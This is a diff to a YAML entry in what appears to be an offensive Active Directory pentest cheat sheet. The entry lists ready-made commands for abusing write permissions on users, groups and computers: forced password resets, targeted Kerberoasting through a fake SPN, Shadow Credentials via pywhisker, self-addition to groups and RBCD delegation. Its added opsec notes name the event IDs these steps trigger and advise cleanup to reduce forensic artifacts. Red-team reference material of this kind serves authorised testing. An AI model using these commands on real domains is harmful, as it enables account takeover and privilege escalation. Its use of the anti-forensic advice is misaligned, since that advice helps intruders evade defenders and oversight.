@@ -5,13 +5,25 @@ commands:
 - net rpc password '<TARGET_USER>' 'NewPassword123!' -U '<DOMAIN>/<YOUR_USER>%<YOUR_PASSWORD>' -S <DC_IP>
 - ''
 - '# On User: Targeted Kerberoasting (set SPN)'
-- setspn -a <FAKE_SPN> <TARGET_USER>
+- setspn -a HTTP/fake.<DOMAIN> <TARGET_USER>
 - GetUserSPNs.py -request -dc-ip <DC_IP> '<DOMAIN>/<USER>:<PASSWORD>'
+- ''
+- '# On User: Shadow Credentials (if ADCS exists)'
+- pywhisker.py -d '<DOMAIN>' -u '<YOUR_USER>' -p '<PASSWORD>' --target '<TARGET_USER>' --action add
 - ''
 - '# On Group: Add yourself'
 - net rpc group addmem '<GROUP>' '<YOUR_USER>' -U '<DOMAIN>/<YOUR_USER>%<YOUR_PASSWORD>' -S <DC_IP>
 - ''
 - '# On Computer: RBCD attack'
 - rbcd.py -delegate-to '<TARGET$>' -delegate-from '<YOUR_COMPUTER$>' '<DOMAIN>/<USER>:<PASSWORD>'
-opsec: []
-references: []
+- ''
+- '# PowerView alternative (Windows)'
+- Set-DomainUserPassword -Identity '<TARGET_USER>' -AccountPassword (ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force)
+opsec:
+- Password changes trigger event 4724 (password reset by admin)
+- SPN modifications trigger event 4742 (computer account changed) or 5136 (directory service object modified)
+- Shadow Credentials leave msDS-KeyCredentialLink modifications
+- Consider cleanup after exploitation to reduce forensic artifacts
+references:
+- https://www.thehacker.recipes/ad/movement/dacl
+- https://attack.mitre.org/techniques/T1098/
